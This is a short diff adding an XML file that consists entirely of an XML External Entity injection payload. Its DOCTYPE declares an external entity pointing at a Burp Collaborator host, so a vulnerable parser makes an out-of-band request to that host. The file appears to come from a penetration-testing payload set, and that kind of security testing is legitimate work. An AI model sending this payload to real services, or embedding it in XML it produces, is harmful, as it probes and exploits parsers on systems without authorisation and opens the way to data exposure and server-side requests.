@@ -1,0 +1,4 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "https://0ghpc1wqfu3tkic279ck1ia3augk49.burpcollaborator.net">]><foo>&xxe;</foo>
